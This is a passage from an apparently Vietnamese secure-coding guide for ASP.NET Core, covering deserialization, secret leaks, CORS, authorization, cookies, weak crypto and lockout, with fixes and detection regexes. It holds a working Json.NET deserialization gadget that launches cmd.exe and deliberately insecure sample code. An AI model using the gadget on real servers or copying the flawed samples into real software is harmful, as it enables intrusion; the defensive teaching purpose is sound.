        safeFileName.IndexOfAny(Path.GetInvalidFileNameChars()) >= 0)
    {
        return BadRequest("Invalid filename");
    }

    var baseDir = Path.GetFullPath(Path.Combine(_env.WebRootPath, "uploads"));
    var filePath = Path.GetFullPath(Path.Combine(baseDir, safeFileName));

    // 3. Verify đường dẫn kết quả vẫn nằm trong baseDir
    if (!filePath.StartsWith(baseDir, StringComparison.OrdinalIgnoreCase))
    {
        return Forbid(); // Path traversal attempt!
    }

    if (!System.IO.File.Exists(filePath))
        return NotFound();

    return PhysicalFile(filePath, "application/octet-stream", safeFileName);
}
```

### 7. Phòng Ngừa

**Checklist:**
- [ ] Luôn dùng `Path.GetFileName()` để lấy tên file thuần túy
- [ ] Dùng `Path.GetFullPath()` và verify kết quả bắt đầu bằng base directory
- [ ] Lưu file bằng GUID thay vì tên user-supplied
- [ ] Không lưu trữ đường dẫn tuyệt đối do user cung cấp

**Roslyn Analyzer Rules:**
```xml
dotnet_diagnostic.SCS0018.severity = error  <!-- Path Traversal -->
```

---

## Pattern 07: Insecure Deserialization

### 1. Tên
**Insecure Deserialization qua BinaryFormatter hoặc TypeNameHandling.All**

### 2. Phân Loại
- **Domain:** Security & Authentication
- **Subcategory:** Deserialization / Remote Code Execution

### 3. Mức Nghiêm Trọng
**CRITICAL** - Cho phép Remote Code Execution (RCE) hoàn toàn, kẻ tấn công kiểm soát server

### 4. Vấn Đề

Deserialize dữ liệu không tin cậy với các serializer nguy hiểm có thể dẫn đến RCE. `BinaryFormatter` đã bị Microsoft đánh dấu `[Obsolete]` vì lý do này. Newtonsoft.Json với `TypeNameHandling.All` cũng rất nguy hiểm.

```
TẤN CÔNG INSECURE DESERIALIZATION
====================================

Kẻ tấn công gửi crafted payload:
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System",
    "StartInfo": {
      "FileName": "cmd.exe",
      "Arguments": "/c whoami > C:\\hacked.txt"
    }
  }
}

Với TypeNameHandling.All:
JsonConvert.DeserializeObject(payload) → THỰC THI cmd.exe → RCE!
```

### 5. Phát Hiện Trong Mã Nguồn

**Regex patterns cho ripgrep:**

```bash
# Tìm BinaryFormatter usage (luôn là nguy hiểm)
rg "BinaryFormatter|NetDataContractSerializer|SoapFormatter" --type cs -n

# Tìm TypeNameHandling không phải None
rg "TypeNameHandling\.(All|Auto|Objects|Arrays)" --type cs -n

# Tìm LosFormatter (ASP.NET ViewState)
rg "LosFormatter|ObjectStateFormatter" --type cs -n

# Tìm JavaScriptSerializer (legacy, có lỗ hổng)
rg "JavaScriptSerializer" --type cs -n
```

### 6. Giải Pháp

**Ví dụ SAI:**

```csharp
// BAD: BinaryFormatter - luôn nguy hiểm
#pragma warning disable SYSLIB0011
var formatter = new BinaryFormatter();
using var stream = new MemoryStream(Convert.FromBase64String(userInput));
var obj = formatter.Deserialize(stream); // RCE nếu userInput độc hại!

// BAD: Newtonsoft.Json TypeNameHandling.All
var settings = new JsonSerializerSettings
{
    TypeNameHandling = TypeNameHandling.All // NGUY HIỂM với input không tin cậy
};
var obj = JsonConvert.DeserializeObject(userJson, settings);
```

**Ví dụ ĐÚNG:**

```csharp
// GOOD: System.Text.Json (mặc định an toàn, không hỗ trợ type name injection)
var obj = JsonSerializer.Deserialize<MySpecificType>(userJson);

// GOOD: Newtonsoft.Json với TypeNameHandling.None (mặc định)
var settings = new JsonSerializerSettings
{
    TypeNameHandling = TypeNameHandling.None // An toàn
};
var obj = JsonConvert.DeserializeObject<MySpecificType>(userJson, settings);

// GOOD: Nếu cần polymorphism, dùng discriminator pattern
[JsonPolymorphic(TypeDiscriminatorPropertyName = "$type")]
[JsonDerivedType(typeof(DogShape), "dog")]
[JsonDerivedType(typeof(CatShape), "cat")]
public abstract class Shape { }

// System.Text.Json sẽ chỉ deserialize các type được khai báo rõ
var shape = JsonSerializer.Deserialize<Shape>(json); // An toàn
```

### 7. Phòng Ngừa

**Checklist:**
- [ ] Không bao giờ dùng `BinaryFormatter` với dữ liệu không tin cậy
- [ ] `TypeNameHandling = TypeNameHandling.None` cho Newtonsoft.Json
- [ ] Ưu tiên `System.Text.Json` (an toàn hơn theo mặc định)
- [ ] Validate và whitelist types nếu cần polymorphism

**Roslyn Analyzer Rules:**
```xml
dotnet_diagnostic.SYSLIB0011.severity = error  <!-- BinaryFormatter obsolete -->
dotnet_diagnostic.SCS0028.severity = error     <!-- Insecure Deserialization -->
```

---

## Pattern 08: Connection String Leak

### 1. Tên
**Connection String Leak - Lộ Thông Tin Kết Nối Database**

### 2. Phân Loại
- **Domain:** Security & Authentication
- **Subcategory:** Credential Exposure / Secret Management

### 3. Mức Nghiêm Trọng
**CRITICAL** - Kẻ tấn công có thể kết nối trực tiếp vào database, đọc/xóa toàn bộ dữ liệu

### 4. Vấn Đề

Connection strings chứa credentials database thường bị lộ qua: hardcode trong source code, commit vào git, hiển thị trong error messages, hoặc log ứng dụng.

```
CÁC ĐIỂM LỘ CONNECTION STRING PHỔ BIẾN
=========================================

1. Source code:
   var conn = "Server=prod.db;Password=SuperSecret123;";

2. Exception response (Developer Mode bật sai môi trường):
   System.Data.SqlClient.SqlException: Cannot open database "prod"
   Connection string: Server=prod.db;User=sa;Password=SuperSecret123

3. Application logs:
   [INFO] Connecting with: Server=prod.db;Password=...

4. Git history:
   git log -p | grep -i "password\|connectionstring"
```

### 5. Phát Hiện Trong Mã Nguồn

**Regex patterns cho ripgrep:**

```bash
# Tìm hardcoded connection strings
rg "Server=.*Password=|Data Source=.*Password=|mongodb://.*:.*@" --type cs --type json -i

# Tìm password trong connection string
rg "(?i)(password|pwd)\s*=\s*[^;\"]{3,}" --type cs

# Tìm connection string trong appsettings (nên dùng env var)
rg "ConnectionStrings" appsettings.json appsettings.Production.json

# Tìm trong log statements
rg "_logger\.Log\w+\s*\(.*connectionString|_logger\.Log\w+\s*\(.*password" --type cs -i
```

### 6. Giải Pháp

**Ví dụ SAI:**

```csharp
// BAD: Hardcode connection string trong code
public class DbContext
{
    private const string ConnectionString =
        "Server=prod-db.company.com;Database=AppDb;User=sa;Password=P@ssw0rd123!";

    public SqlConnection GetConnection()
        => new SqlConnection(ConnectionString);
}

// BAD: Log connection string
_logger.LogInformation("Connecting to: {ConnStr}", connectionString);

// BAD: Return connection info trong error response
app.UseExceptionHandler(errorApp =>
{
    errorApp.Run(async context =>
    {
        var error = context.Features.Get<IExceptionHandlerFeature>();
        // Lộ stack trace và connection string!
        await context.Response.WriteAsJsonAsync(new { error = error?.Error.ToString() });
    });
});
```

```json
// BAD: appsettings.Production.json trong git
{
  "ConnectionStrings": {
    "DefaultConnection": "Server=prod-db;Password=SuperSecret123;"
  }
}
```

**Ví dụ ĐÚNG:**

```csharp
// GOOD: Đọc từ environment variable hoặc Secret Manager
// Program.cs
builder.Configuration.AddEnvironmentVariables();

// Trong appsettings.json (không có password)
// "ConnectionStrings:DefaultConnection" lấy từ env var:
// CONNECTIONSTRINGS__DEFAULTCONNECTION=Server=...;Password=...

// GOOD: Azure Key Vault / AWS Secrets Manager
builder.Configuration.AddAzureKeyVault(
    new Uri($"https://{keyVaultName}.vault.azure.net/"),
    new DefaultAzureCredential());

// GOOD: .NET Secret Manager (dev only)
// dotnet user-secrets set "ConnectionStrings:DefaultConnection" "Server=..."

// GOOD: Error handling không lộ thông tin
app.UseExceptionHandler(errorApp =>
{
    errorApp.Run(async context =>
    {
        var errorFeature = context.Features.Get<IExceptionHandlerFeature>();
        var logger = context.RequestServices.GetRequiredService<ILogger<Program>>();

        // Log chi tiết nội bộ
        logger.LogError(errorFeature?.Error, "Unhandled exception");

        // Trả về message chung chung cho client
        context.Response.StatusCode = 500;
        await context.Response.WriteAsJsonAsync(new
        {
            error = "An internal error occurred.",
            traceId = Activity.Current?.Id ?? context.TraceIdentifier
        });
    });
});
```

```gitignore
# .gitignore - Không commit file secrets
appsettings.Production.json
appsettings.Staging.json
*.secrets.json
.env
secrets/
```

### 7. Phòng Ngừa

**Checklist:**
- [ ] Không bao giờ hardcode connection string trong source code
- [ ] Không commit `appsettings.Production.json` vào git
- [ ] Dùng environment variables hoặc Secret Manager cho production
- [ ] Không log connection strings (kể cả ở level DEBUG)
- [ ] Tắt `UseDeveloperExceptionPage` trong production
- [ ] Thêm file secrets vào `.gitignore`
- [ ] Scan git history để phát hiện secrets đã commit: `git secrets --scan-history`

**Roslyn Analyzer Rules:**
```xml
<!-- Dùng công cụ scan riêng: -->
<!-- git-secrets, truffleHog, gitleaks -->
<!-- GitHub Secret Scanning (tự động trên GitHub) -->
dotnet_diagnostic.S2068.severity = error  <!-- Hard-coded credentials (SonarAnalyzer) -->
```

---

## Pattern 09: CORS Wildcard Với AllowCredentials

### 1. Tên
**CORS Cấu Hình Sai: AllowAnyOrigin Kết Hợp AllowCredentials**

### 2. Phân Loại
- **Domain:** Security & Authentication
- **Subcategory:** CORS Misconfiguration / Cross-Origin Security

### 3. Mức Nghiêm Trọng
**HIGH** - Cho phép website độc hại đọc authenticated responses (cookie/session data)

### 4. Vấn Đề

CORS với `AllowAnyOrigin()` và `AllowCredentials()` cùng nhau vi phạm Same-Origin Policy và bị trình duyệt từ chối. Nhưng ngay cả khi cố gắng bypass bằng cách set `Access-Control-Allow-Origin: *` thủ công, credential-based requests vẫn có thể bị khai thác.

```
VẤN ĐỀ CORS VỚI CREDENTIALS
==============================

Browser Rule:
  Nếu Allow-Credentials: true
  → Access-Control-Allow-Origin KHÔNG ĐƯỢC là "*"
  → Phải là explicit origin

Cấu hình SAI sẽ:
  1. Bị trình duyệt block (CORS error)
  2. Dev cố "fix" bằng cách tắt CORS validation
  3. Hoặc reflect back bất kỳ origin nào → nguy hiểm

REFLECT ORIGIN ATTACK
======================
Origin: https://evil.com
→ Server respond: Access-Control-Allow-Origin: https://evil.com
→ evil.com đọc được authenticated response!
```

### 5. Phát Hiện Trong Mã Nguồn

**Regex patterns cho ripgrep:**

```bash
# Tìm AllowAnyOrigin với AllowCredentials
rg "AllowAnyOrigin|AllowCredentials" --type cs -n

# Tìm reflect origin pattern (nguy hiểm nhất)
rg "Request\.Headers\[.Origin.\]|GetOrigin|reflectOrigin" --type cs -i

# Tìm CORS policy config
rg "AddCors|UseCors|WithOrigins" --type cs -n

# Tìm manual CORS header setting
rg "Access-Control-Allow-Origin" --type cs -n
```

### 6. Giải Pháp

**Ví dụ SAI:**

```csharp
// BAD: AllowAnyOrigin + AllowCredentials (bị browser block, dev thường "fix" sai)
builder.Services.AddCors(options =>
{
    options.AddPolicy("AllowAll", policy =>
    {
        policy.AllowAnyOrigin()    // NGUY HIỂM khi kết hợp với:
              .AllowAnyMethod()
              .AllowAnyHeader()
              .AllowCredentials(); // Không hợp lệ với AllowAnyOrigin!
    });
});

// BAD: Reflect origin (worst case)
app.Use(async (context, next) =>
{
    var origin = context.Request.Headers["Origin"].ToString();
    context.Response.Headers["Access-Control-Allow-Origin"] = origin; // Reflect bất kỳ origin
    context.Response.Headers["Access-Control-Allow-Credentials"] = "true";
    await next();
});
```

**Ví dụ ĐÚNG:**

```csharp
// GOOD: Whitelist origins cụ thể
builder.Services.AddCors(options =>
{
    options.AddPolicy("ProductionPolicy", policy =>
    {
        policy.WithOrigins(
                "https://app.company.com",
                "https://admin.company.com"
              )
              .AllowAnyMethod()
              .AllowAnyHeader()
              .AllowCredentials(); // An toàn vì origins được whitelist
    });

    // Policy riêng cho public APIs (không cần credentials)
    options.AddPolicy("PublicApiPolicy", policy =>
    {
        policy.AllowAnyOrigin()   // OK vì không có credentials
              .AllowAnyMethod()
              .AllowAnyHeader();
              // Không có .AllowCredentials()
    });
});

// GOOD: Đọc allowed origins từ config
var allowedOrigins = builder.Configuration
    .GetSection("Cors:AllowedOrigins")
    .Get<string[]>() ?? Array.Empty<string>();

builder.Services.AddCors(options =>
{
    options.AddPolicy("ConfiguredPolicy", policy =>
    {
        policy.WithOrigins(allowedOrigins)
              .AllowAnyMethod()
              .AllowAnyHeader()
              .AllowCredentials();
    });
});
```

### 7. Phòng Ngừa

**Checklist:**
- [ ] Không dùng `AllowAnyOrigin()` với `AllowCredentials()`
- [ ] Whitelist origins cụ thể trong config (không hardcode)
- [ ] Public APIs (không cần auth): `AllowAnyOrigin()` OK
- [ ] Không bao giờ reflect `Origin` header trực tiếp vào response
- [ ] Test CORS policy với trình duyệt thực, không chỉ Postman (Postman bỏ qua CORS)

**Roslyn Analyzer Rules:**
```xml
dotnet_diagnostic.SCS0008.severity = error  <!-- CORS Misconfiguration -->
```

---

## Pattern 10: Authorize Attribute Thiếu

### 1. Tên
**Endpoint Thiếu [Authorize] Attribute - Unauthorized Access**

### 2. Phân Loại
- **Domain:** Security & Authentication
- **Subcategory:** Authorization / Access Control

### 3. Mức Nghiêm Trọng
**HIGH** - Endpoint nhạy cảm không được bảo vệ, bất kỳ ai cũng có thể truy cập

### 4. Vấn Đề

Trong ASP.NET Core, mặc định tất cả endpoints là public trừ khi có `[Authorize]`. Khi thêm controller mới hoặc action mới, dễ quên thêm authorization attribute.

```
DEFAULT BEHAVIOR ASP.NET CORE
===============================

[ApiController]
[Route("api/[controller]")]
public class AdminController : ControllerBase  ← Không có [Authorize]!
{
    [HttpGet("users")]      ← Public! Bất kỳ ai cũng GET được
    [HttpDelete("{id}")]    ← Public! Bất kỳ ai cũng DELETE được
    [HttpPost("config")]    ← Public! Bất kỳ ai cũng thay đổi config
}
```

### 5. Phát Hiện Trong Mã Nguồn

**Regex patterns cho ripgrep:**

```bash
# Tìm controllers không có [Authorize]
rg "class \w+Controller" --type cs -l | xargs rg -L "\[Authorize"

# Tìm HTTP action methods trong controller không có Authorize
rg "\[Http(Get|Post|Put|Delete|Patch)\]" --type cs -B 5 | grep -v "Authorize\|AllowAnonymous"

# Tìm tất cả controllers để audit
rg "class \w+Controller\s*:" --type cs -n

# Tìm [AllowAnonymous] để verify chúng thực sự cần public
rg "\[AllowAnonymous\]" --type cs -n
```

### 6. Giải Pháp

**Ví dụ SAI:**

```csharp
// BAD: Controller không có [Authorize]
[ApiController]
[Route("api/admin")]
public class AdminController : ControllerBase
{
    [HttpGet("users")]
    public async Task<IActionResult> GetAllUsers() { ... } // Public!

    [HttpDelete("users/{id}")]
    public async Task<IActionResult> DeleteUser(int id) { ... } // Public!
}
```

**Ví dụ ĐÚNG:**

```csharp
// GOOD: Authorize ở cấp controller (áp dụng cho tất cả actions)
[ApiController]
[Route("api/admin")]
[Authorize(Roles = "Admin")]  // Chỉ Admin mới truy cập được
public class AdminController : ControllerBase
{
    [HttpGet("users")]
    public async Task<IActionResult> GetAllUsers() { ... }

    // Action cần quyền cao hơn
    [HttpDelete("users/{id}")]
    [Authorize(Roles = "SuperAdmin")]
    public async Task<IActionResult> DeleteUser(int id) { ... }

    // Action public (ngoại lệ phải explicit)
    [HttpGet("health")]
    [AllowAnonymous]
    public IActionResult HealthCheck() => Ok("healthy");
}

// GOOD: Global authorization policy (secure by default)
// Program.cs
builder.Services.AddAuthorization(options =>
{
    // Yêu cầu authenticated cho tất cả endpoints
    options.FallbackPolicy = new AuthorizationPolicyBuilder()
        .RequireAuthenticatedUser()
        .Build();
});

// Endpoints public phải explicit [AllowAnonymous]
[AllowAnonymous]
[HttpPost("auth/login")]
public IActionResult Login(LoginRequest request) { ... }
```

### 7. Phòng Ngừa

**Checklist:**
- [ ] Implement Fallback Policy (secure by default) trong `AddAuthorization`
- [ ] Mọi controller có `[Authorize]` trừ khi explicit `[AllowAnonymous]`
- [ ] Code review checklist bao gồm kiểm tra authorization
- [ ] Audit định kỳ: liệt kê tất cả public endpoints

**Roslyn Analyzer Rules:**
```xml
dotnet_diagnostic.SCS0007.severity = warning  <!-- Missing Authorize -->
```

---

## Pattern 11: Anti-Forgery Cookie SameSite Thiếu Cấu Hình

### 1. Tên
**Anti-Forgery Cookie Thiếu SameSite Attribute**

### 2. Phân Loại
- **Domain:** Security & Authentication
- **Subcategory:** Cookie Security / CSRF Prevention

### 3. Mức Nghiêm Trọng
**MEDIUM** - Giảm hiệu quả bảo vệ CSRF, tăng nguy cơ tấn công cross-site

### 4. Vấn Đề

`SameSite` cookie attribute ngăn browser gửi cookie trong cross-site requests. Thiếu `SameSite` hoặc set `SameSite=None` không đúng cách làm giảm bảo vệ CSRF, đặc biệt trên các trình duyệt cũ.

```
SAMESITE ATTRIBUTE BEHAVIOR
=============================

SameSite=Strict  → Cookie CHỈ gửi từ cùng site (bảo mật nhất)
                   Nhược điểm: Link từ email/external không mang cookie
                               → User phải login lại

SameSite=Lax     → Cookie gửi trong top-level navigation (GET)
                   Không gửi trong cross-site POST, iframe, fetch
                   → Cân bằng tốt giữa bảo mật và UX

SameSite=None    → Cookie gửi trong mọi cross-site request
                   Bắt buộc kèm Secure=true
                   Chỉ dùng cho cases cần cross-site (payment, SSO)

Không set SameSite → Behavior tùy browser (Chrome >= 80: default Lax)
                     Trình duyệt cũ: default None (NGUY HIỂM)
```

### 5. Phát Hiện Trong Mã Nguồn

**Regex patterns cho ripgrep:**

```bash
# Tìm cookie options thiếu SameSite
rg "CookieOptions|CookieBuilder" --type cs -A 10 | grep -v "SameSite"

# Tìm SameSite.None (cần Secure=true)
rg "SameSite\s*=\s*SameSiteMode\.None" --type cs -n

# Tìm cấu hình cookie trong Program.cs/Startup.cs
rg "AddCookie|ConfigureApplicationCookie|AddAntiforgery" --type cs -n
```

### 6. Giải Pháp

**Ví dụ SAI:**

```csharp
// BAD: Cookie không có SameSite
Response.Cookies.Append("session", token, new CookieOptions
{
    HttpOnly = true,
    Secure = true
    // Thiếu SameSite!
});

// BAD: SameSite.None không có Secure
Response.Cookies.Append("tracker", value, new CookieOptions
{
    SameSite = SameSiteMode.None,
    Secure = false // NGUY HIỂM và bị browser reject
});
```

**Ví dụ ĐÚNG:**

```csharp
// GOOD: Session cookie với SameSite=Lax (cân bằng)
Response.Cookies.Append("session", token, new CookieOptions
{
    HttpOnly = true,
    Secure = true,
    SameSite = SameSiteMode.Lax,
    Expires = DateTimeOffset.UtcNow.AddHours(8)
});

// GOOD: Cấu hình global cho toàn bộ ứng dụng
// Program.cs
builder.Services.ConfigureApplicationCookie(options =>
{
    options.Cookie.HttpOnly = true;
    options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
    options.Cookie.SameSite = SameSiteMode.Strict;
    options.ExpireTimeSpan = TimeSpan.FromHours(8);
    options.SlidingExpiration = true;
});

// GOOD: Anti-forgery cookie
builder.Services.AddAntiforgery(options =>
{
    options.Cookie.Name = "__Host-XSRF-TOKEN";
    options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
    options.Cookie.SameSite = SameSiteMode.Strict;
    options.Cookie.HttpOnly = false; // Cần false để JS đọc được (nếu dùng JS client)
    options.HeaderName = "X-XSRF-TOKEN";
});
```

### 7. Phòng Ngừa

**Checklist:**
- [ ] Tất cả cookies có `SameSite=Lax` hoặc `SameSite=Strict`
- [ ] `SameSite=None` chỉ dùng khi thực sự cần cross-site, kèm `Secure=true`
- [ ] `HttpOnly=true` cho session cookies
- [ ] `Secure=true` trong production
- [ ] Cấu hình global trong `ConfigureApplicationCookie`

**Roslyn Analyzer Rules:**
```xml
dotnet_diagnostic.SCS0009.severity = warning  <!-- Cookie without SameSite -->
```

---

## Pattern 12: Cryptography Sai (MD5/SHA1/DES)

### 1. Tên
**Dùng Thuật Toán Mã Hóa Lỗi Thời: MD5, SHA1, DES, 3DES**

### 2. Phân Loại
- **Domain:** Security & Authentication
- **Subcategory:** Cryptography / Password Hashing

### 3. Mức Nghiêm Trọng
**HIGH** - Password hash bị crack, dữ liệu mã hóa bị giải mã, hệ thống tưởng an toàn nhưng không phải

### 4. Vấn Đề

MD5 và SHA1 đã bị phá vỡ về mặt mật mã học. DES key chỉ 56 bits có thể brute-force trong vài giờ. Dùng các thuật toán này để hash password hoặc mã hóa dữ liệu nhạy cảm là không an toàn.

```
TẠI SAO MD5/SHA1 KHÔNG AN TOÀN ĐỂ HASH PASSWORD?
===================================================

1. Tốc độ cao (thiết kế để NHANH) = Brute-force dễ
   MD5: 200 tỷ hash/giây trên GPU hiện đại
   → Password 8 ký tự: crack trong < 1 giây

2. Không có salt mặc định → Rainbow table attack
   MD5("password123") = 482c811da5d5b4bc6d497ffa98491e38
   → Tìm trong bảng lookup ngay lập tức

3. Collision attacks (SHA1, MD5)
   → Hai file khác nhau có cùng hash → Signature bypass

THUẬT TOÁN AN TOÀN ĐỂ HASH PASSWORD:
- BCrypt (cost factor 10+)
- Argon2id (winner of Password Hashing Competition)
- PBKDF2-SHA256 (ASP.NET Identity mặc định)
- SCrypt

THUẬT TOÁN AN TOÀN ĐỂ MÃ HÓA:
- AES-256-GCM (symmetric)
- RSA-2048 + OAEP (asymmetric)
- ChaCha20-Poly1305
```

### 5. Phát Hiện Trong Mã Nguồn

**Regex patterns cho ripgrep:**

```bash
# Tìm MD5 usage
rg "MD5\.|new MD5CryptoServiceProvider|MD5\.Create|HashAlgorithm\.Create\(\"MD5\"" --type cs -n

# Tìm SHA1 usage
rg "SHA1\.|new SHA1CryptoServiceProvider|SHA1\.Create|HashAlgorithm\.Create\(\"SHA1\"" --type cs -n

# Tìm DES/3DES usage
rg "DES\.|TripleDES\.|new DESCryptoServiceProvider|new TripleDESCryptoServiceProvider" --type cs -n

# Tìm ECB mode (insecure block cipher mode)
rg "CipherMode\.ECB" --type cs -n

# Tìm random number generators yếu
rg "new Random\(\)|System\.Random" --type cs -n
```

### 6. Giải Pháp

**Ví dụ SAI:**

```csharp
// BAD: MD5 để hash password
public string HashPassword(string password)
{
    using var md5 = MD5.Create();
    var bytes = Encoding.UTF8.GetBytes(password);
    var hash = md5.ComputeHash(bytes);
    return Convert.ToHexString(hash); // KHÔNG BAO GIỜ dùng cho password!
}

// BAD: DES để mã hóa dữ liệu nhạy cảm
public byte[] EncryptData(byte[] data, byte[] key)
{
    using var des = DES.Create();
    des.Key = key; // 56-bit key = yếu!
    des.Mode = CipherMode.ECB; // ECB không an toàn!
    using var encryptor = des.CreateEncryptor();
    return encryptor.TransformFinalBlock(data, 0, data.Length);
}

// BAD: SHA1 để verify integrity
var sha1 = SHA1.Create();
var hash = sha1.ComputeHash(fileBytes); // Collision attack có thể bypass
```

**Ví dụ ĐÚNG:**

```csharp
// GOOD: BCrypt để hash password (cài BCrypt.Net-Next)
using BCrypt.Net;

public string HashPassword(string password)
{
    return BCrypt.HashPassword(password, workFactor: 12); // Cost factor 12+
}

public bool VerifyPassword(string password, string hash)
{
    return BCrypt.Verify(password, hash);
}

// GOOD: ASP.NET Identity PasswordHasher (PBKDF2-SHA256 với salt)
var hasher = new PasswordHasher<User>();
var hashed = hasher.HashPassword(user, "MyPassword123!");
var result = hasher.VerifyHashedPassword(user, hashed, "MyPassword123!");

// GOOD: AES-256-GCM để mã hóa dữ liệu (authenticated encryption)
public static (byte[] ciphertext, byte[] nonce, byte[] tag) Encrypt(
    byte[] plaintext, byte[] key)
{
    var nonce = new byte[AesGcm.NonceByteSizes.MaxSize];
    RandomNumberGenerator.Fill(nonce);

    var ciphertext = new byte[plaintext.Length];
    var tag = new byte[AesGcm.TagByteSizes.MaxSize];

    using var aes = new AesGcm(key, AesGcm.TagByteSizes.MaxSize);
    aes.Encrypt(nonce, plaintext, ciphertext, tag);

    return (ciphertext, nonce, tag);
}

// GOOD: SHA-256 hoặc SHA-512 cho integrity check (không phải password)
using var sha256 = SHA256.Create();
var hash = sha256.ComputeHash(fileBytes); // OK cho checksums

// GOOD: Secure random number generation
var randomBytes = new byte[32];
RandomNumberGenerator.Fill(randomBytes); // Dùng thay vì new Random()
var secureToken = Convert.ToBase64String(randomBytes);
```

### 7. Phòng Ngừa

**Checklist:**
- [ ] Password: dùng BCrypt, Argon2id, hoặc PBKDF2 (qua ASP.NET Identity)
- [ ] Symmetric encryption: AES-256-GCM hoặc AES-256-CBC với HMAC
- [ ] Integrity check: SHA-256 hoặc SHA-512 (MD5/SHA1 chỉ cho non-security checksums)
- [ ] Random token: `RandomNumberGenerator.Fill()`, không phải `new Random()`
- [ ] Không dùng DES, 3DES, RC2, RC4

**Roslyn Analyzer Rules:**
```xml
dotnet_diagnostic.CA5350.severity = error  <!-- Do Not Use Weak Cryptographic Algorithms (SHA1) -->
dotnet_diagnostic.CA5351.severity = error  <!-- Do Not Use Broken Cryptographic Algorithms (MD5) -->
dotnet_diagnostic.CA5358.severity = error  <!-- Review cipher mode usage -->
dotnet_diagnostic.CA5379.severity = error  <!-- Do Not Use Weak Key Derivation Function Algorithm -->
dotnet_diagnostic.SCS0006.severity = error <!-- Weak hashing function -->
```

---

## Pattern 13: Identity Lockout Thiếu

### 1. Tên
**Thiếu Account Lockout - Cho Phép Brute-Force Login**

### 2. Phân Loại
- **Domain:** Security & Authentication
- **Subcategory:** Brute-Force Prevention / Rate Limiting

### 3. Mức Nghiêm Trọng
**MEDIUM** - Kẻ tấn công có thể thử vô hạn mật khẩu, đặc biệt nguy hiểm với mật khẩu yếu

### 4. Vấn Đề

Không có account lockout cho phép kẻ tấn công thực hiện brute-force tấn công login endpoint không giới hạn. Kết hợp với mật khẩu yếu hoặc danh sách mật khẩu phổ biến (credential stuffing), tài khoản có thể bị chiếm trong thời gian ngắn.

```
TẤN CÔNG BRUTE-FORCE VÀ CREDENTIAL STUFFING
=============================================

Brute-Force:
  Thử: password, 123456, qwerty, admin123...
  Không có lockout → Thử được hàng triệu lần
  Tool: Hydra, Medusa, Burp Intruder

Credential Stuffing:
  Dùng danh sách username/password từ data breach
  (Have I Been Pwned database: hàng tỷ credentials)
  Nếu user tái sử dụng mật khẩu → Tài khoản bị chiếm

LOCKOUT STRATEGY
================
  5 lần thất bại → Lock 15 phút
  10 lần thất bại → Lock 1 giờ
  Hoặc: Progressive delay (1s, 2s, 4s, 8s...)
  Captcha sau X lần thất bại
```

### 5. Phát Hiện Trong Mã Nguồn

**Regex patterns cho ripgrep:**

```bash
# Tìm login logic thiếu lockout
rg "SignInAsync|PasswordSignInAsync|CheckPasswordAsync" --type cs -n

# Tìm ASP.NET Identity LockoutOptions
rg "LockoutOptions|MaxFailedAccessAttempts|DefaultLockoutTimeSpan" --type cs -n

# Tìm lockout disabled
rg "lockoutOnFailure\s*:\s*false|LockoutEnabled\s*=\s*false" --type cs -n

# Tìm rate limiting configuration
rg "RateLimiter|AddRateLimiter|FixedWindowRateLimiter" --type cs -n
```

### 6. Giải Pháp

**Ví dụ SAI:**

```csharp
// BAD: Login không có lockout protection
[HttpPost("login")]
public async Task<IActionResult> Login(LoginRequest request)
{
    var user = await _userManager.FindByEmailAsync(request.Email);
    if (user == null) return Unauthorized();

    // CheckPasswordAsync không tăng failed attempt count, không lock!
    var isValid = await _userManager.CheckPasswordAsync(user, request.Password);
    if (!isValid) return Unauthorized();

    // Generate token...
    return Ok(new { token = GenerateToken(user) });
}

// BAD: Tắt lockout trong Identity config
builder.Services.AddIdentity<User, Role>(options =>
{
    options.Lockout.AllowedForNewUsers = false; // Tắt lockout hoàn toàn!
    options.Lockout.MaxFailedAccessAttempts = 1000; // Thực tế = không lockout
});
```

**Ví dụ ĐÚNG:**

```csharp
// GOOD: Dùng PasswordSignInAsync với lockoutOnFailure=true
[HttpPost("login")]
public async Task<IActionResult> Login(LoginRequest request)
{
    var result = await _signInManager.PasswordSignInAsync(
        request.Email,
        request.Password,
        isPersistent: false,
        lockoutOnFailure: true); // Tự động lock sau N lần thất bại

    if (result.IsLockedOut)
    {
        _logger.LogWarning("Account {Email} locked out", request.Email);
        return StatusCode(429, new
        {
            error = "Account temporarily locked. Try again later.",
            retryAfter = 900 // seconds
        });
    }

    if (!result.Succeeded)
    {
        return Unauthorized(new { error = "Invalid credentials" });
    }

    return Ok(new { token = await GenerateTokenAsync(request.Email) });
}

// GOOD: Identity lockout configuration
builder.Services.AddIdentity<User, Role>(options =>
{
    // Lockout settings
    options.Lockout.DefaultLockoutTimeSpan = TimeSpan.FromMinutes(15);
    options.Lockout.MaxFailedAccessAttempts = 5;
    options.Lockout.AllowedForNewUsers = true;

    // Password requirements
    options.Password.RequiredLength = 12;
    options.Password.RequireUppercase = true;
    options.Password.RequireDigit = true;
    options.Password.RequireNonAlphanumeric = true;
});

// GOOD: Rate limiting cho login endpoint (.NET 7+)
builder.Services.AddRateLimiter(options =>
{
    options.AddFixedWindowLimiter("LoginPolicy", limiterOptions =>
    {
        limiterOptions.PermitLimit = 5;
        limiterOptions.Window = TimeSpan.FromMinutes(1);
        limiterOptions.QueueProcessingOrder = QueueProcessingOrder.OldestFirst;
        limiterOptions.QueueLimit = 0;
    });
});

// Áp dụng rate limit cho login endpoint
app.MapPost("/api/auth/login", Login)
    .RequireRateLimiting("LoginPolicy");
```

### 7. Phòng Ngừa

**Checklist:**
- [ ] `lockoutOnFailure: true` trong `PasswordSignInAsync`
- [ ] `MaxFailedAccessAttempts = 5` và `DefaultLockoutTimeSpan = 15 phút`
- [ ] Implement rate limiting cho login endpoint
- [ ] Log và alert khi có brute-force attempt
- [ ] Xem xét CAPTCHA sau 3 lần thất bại liên tiếp
- [ ] Implement anomaly detection (login từ IP lạ, địa điểm lạ)

**Roslyn Analyzer Rules:**
```xml
<!-- Không có Roslyn rule trực tiếp, nhưng dùng audit tool: -->
<!-- OWASP ZAP Authentication Testing -->
<!-- Custom code review checklist cho login endpoints -->
```

---

## Pattern 14: Data Protection Key Rotation

### 1. Tên
**Data Protection Key Rotation Thiếu Cấu Hình**

### 2. Phân Loại
- **Domain:** Security & Authentication
- **Subcategory:** Key Management / Data Protection

### 3. Mức Nghiêm Trọng
